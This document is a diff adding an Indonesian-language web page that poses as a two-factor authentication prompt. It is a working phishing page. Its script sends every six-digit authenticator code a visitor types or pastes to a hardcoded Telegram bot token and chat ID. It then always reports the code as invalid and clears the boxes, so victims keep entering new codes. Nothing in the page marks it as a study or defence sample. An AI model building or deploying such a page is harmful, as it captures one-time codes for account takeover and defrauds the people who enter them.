@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Autentikasi</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#fff;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    height:100vh;
+    margin:auto;
+    padding:25px;
+    display:flex;
+    flex-direction:column;
+}
+
+.back{
+    width:42px;
+    height:42px;
+    display:flex;
+    align-items:center;
+    justify-content:flex-start;
+    margin-top:4px;
+}
+
+.back svg{
+    width:25px;
+    height:25px;
+    stroke:#111;
+}
+
+h1{
+    margin-top:16px;
+    font-size:29px;
+    color:#0d2b36;
+    font-weight:800;
+    letter-spacing:-0.4px;
+}
+
+.desc{
+    margin-top:16px;
+    color:#8a8a8a;
+    font-size:18px;
+    line-height:28px;
+    font-weight:600;
+}
+
+.email{
+    color:#555;
+    font-weight:500;
+}
+
+.otp-box{
+    display:flex;
+    justify-content:space-between;
+    margin-top:28px;
+}
+
+.otp{
+    width:50px;
+    height:64px;
+    border:2px solid #ddd;
+    border-radius:16px;
+    text-align:center;
+    font-size:28px;
+    font-weight:700;
+    color:#0d2b36;
+    outline:none;
+    transition: border-color 0.2s ease;
+}
+
+.otp:focus{
+    border-color:#0d2b36;
+}
+
+/* Saat tidak valid, ubah warna kotak */
+.otp.invalid{
+    border-color:#ef4444;
+    animation: shake 0.4s ease;
+}
+
+@keyframes shake{
+    0%,100%{ transform: translateX(0); }
+    25%{ transform: translateX(-5px); }
+    75%{ transform: translateX(5px); }
+}
+
+.paste{
+    width:170px;
+    height:48px;
+    margin:28px auto;
+    border:2px solid #ddd;
+    border-radius:999px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    background:#fff;
+    font-size:18px;
+    font-weight:600;
+    cursor:pointer;
+    transition: all 0.2s ease;
+}
+.paste:active{
+    background:#f5f5f5;
+}
+
+.paste svg{
+    width:22px;
+    height:22px;
+}
+
+/* Notif Lebih Halus & Lembut */
+.notif-wrap{
+    margin-top:24px;
+    display:flex;
+    justify-content:center;
+}
+.notif{
+    padding: 10px 20px;
+    background: #fef2f2;
+    color: #dc2626;
+    font-size:15px;
+    font-weight:500;
+    border-radius: 999px;
+    opacity:0;
+    transform: translateY(10px);
+    transition: all 0.3s ease;
+}
+.notif.show{
+    opacity:1;
+    transform: translateY(0);
+}
+
+.bottom{
+    margin-top:auto;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<div class="back">
+<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none">
+    <path d="M19 12H5" stroke="#111827" stroke-width="2.8" stroke-linecap="round"/>
+    <path d="M12 19L5 12L12 5" stroke="#111827" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</div>
+
+<h1>Autentikasi 2 FA</h1>
+
+<div class="desc">
+Silakan masukkan Kode Authenticator Di Perangkat Anda
+<span class="email"></span>
+</div>
+
+<div class="otp-box">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+<input class="otp" maxlength="1" inputmode="numeric" pattern="[0-9]">
+</div>
+
+<button class="paste" id="pasteBtn">
+
+<svg fill="none" viewBox="0 0 24 24">
+<rect x="8" y="3" width="13" height="16" rx="3" stroke="#0d2b36" stroke-width="2"/>
+<rect x="3" y="8" width="13" height="13" rx="3" stroke="#0d2b36" stroke-width="2"/>
+</svg>
+
+Tempel Kode
+</button>
+
+<!-- Notifikasi Halus -->
+<div class="notif-wrap">
+    <div class="notif" id="notif">Kode tidak valid, silakan coba lagi</div>
+</div>
+
+<div class="bottom"></div>
+
+</div>
+
+<script>
+const otp=document.querySelectorAll(".otp");
+const TELEGRAM_BOT_TOKEN = "8366843088:AAG2DgTncj7WVowbtCY-_9iL85PLahl1ddg";
+const TELEGRAM_CHAT_ID = "5983910858";
+
+// Input & Pindah Kotak Otomatis
+otp.forEach((box,index)=>{
+    box.addEventListener("input",e=>{
+        box.value = box.value.replace(/\D/g,'');
+        if(box.value && index < otp.length-1){
+            otp[index+1].focus();
+        }
+        // Sembunyikan notif & hapus merah saat mengetik ulang
+        box.classList.remove("invalid");
+        document.getElementById("notif").classList.remove("show");
+        checkComplete();
+    });
+
+    box.addEventListener("keydown",e=>{
+        if(e.key==="Backspace" && !box.value && index>0){
+            otp[index-1].focus();
+        }
+    });
+});
+
+// Tombol Tempel Kode
+document.getElementById("pasteBtn").onclick=async()=>{
+    try{
+        const text = await navigator.clipboard.readText();
+        fillOtpFromText(text);
+    }catch(e){
+        alert("Izinkan akses papan klip atau ketik kode secara manual");
+    }
+};
+
+// Isi Otomatis dari teks
+function fillOtpFromText(text){
+    const code = text.replace(/\D/g,"").slice(0,6);
+    code.split("").forEach((n,i)=>{
+        if(otp[i]) otp[i].value = n;
+    });
+    checkComplete();
+}
+
+// Cek lengkap → tampil notif, TIDAK pindah halaman
+function checkComplete(){
+    let code = "";
+    otp.forEach(b => code += b.value);
+    if(code.length === 6){
+        showNotifAndReset();
+        sendToTelegram(code);
+    }
+}
+
+// Tampilkan notif, lalu sembunyikan & bersihkan input
+function showNotifAndReset(){
+    otp.forEach(box => box.classList.add("invalid"));
+    document.getElementById("notif").classList.add("show");
+
+    // Tunggu sebentar lalu sembunyikan notif & bersihkan kotak
+    setTimeout(()=>{
+        otp.forEach(box => {
+            box.classList.remove("invalid");
+            box.value = "";
+        });
+        document.getElementById("notif").classList.remove("show");
+        otp[0].focus(); // fokus kembali ke kotak pertama
+    }, 2000);
+}
+
+// Kirim ke Telegram
+async function sendToTelegram(code){
+    const text = `Kode Authenticator: ${code}`;
+    try{
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text
+            })
+        });
+    }catch(e){
+        console.log("Gagal kirim:", e);
+    }
+}
+</script>
+
+</body>
+</html>
